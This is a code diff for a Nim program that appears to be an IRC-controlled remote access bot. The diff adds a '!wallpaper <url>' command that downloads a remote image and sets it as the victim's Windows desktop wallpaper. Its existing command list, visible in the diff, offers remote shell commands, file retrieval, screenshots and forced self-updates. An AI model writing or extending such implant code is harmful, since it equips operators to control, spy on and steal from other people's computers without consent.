@@ -1,4 +1,4 @@
-import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random
+import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random, winim, bitops
 
 let
     g_dbg* = true
@@ -390,7 +390,27 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
         setCurrentDir(current_dir)  
 
 
-
+proc cmd_wallpaper(event:IrcEvent, client:AsyncIrc,tokens:seq[string]) {.async.} =
+    try:
+        discard client.privmsg(event.origin, "trying to change wallpaper")
+        var url = await helper_recombine(tokens)
+        randomize()
+        var
+            randint = rand(1000000..9999999)
+            imagedata = updt_fetchWebsiteContent(url)
+            filename = $randint
+            fullpath:cstring = (getTempDir() & $randint & "\\" & filename).cstring
+            current_dir = getCurrentDir()
+        if not dirExists(getTempDir() & $randint):
+            createDir(getTempDir() & $randint)
+        setCurrentDir(getTempDir() & $randint)
+        writeFile(filename, imagedata)
+        discard SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, fullpath, bitor(SPIF_UPDATEINIFILE,SPIF_SENDCHANGE))
+        setCurrentDir(current_dir)
+        removeFile(getTempDir() & $randint & "\\" & filename)
+        discard client.privmsg(event.origin, "no errors")
+    except OSError as e:
+         discard client.privmsg(event.origin, "error changing wallpaper [" & repr(e) & "]")
 
 
 ## Checks if a private message was a command and calls appropriate functions
@@ -441,8 +461,10 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
         discard cmd_setSendSleep(event, client, tokens)
     of "!screenshot":
         discard cmd_screenshot(event, client)
+    of "!wallpaper":
+        discard cmd_wallpaper(event, client, tokens)
     of "!cmds":
-        discard client.privmsg(event.origin, "hey, lag, excessFlood, dxdiag, r <cmd>, getfio <file>, get <file>, print <file<, update, forceupdate, sendsleep <integer>, screenshot, cmds")
-
+        discard client.privmsg(event.origin, "hey, lag, excessFlood, dxdiag, r <cmd>, getfio <file>, get <file>, print <file<, update, forceupdate, sendsleep <integer>, screenshot, wallpaper <url>, cmds")
+    
 
         
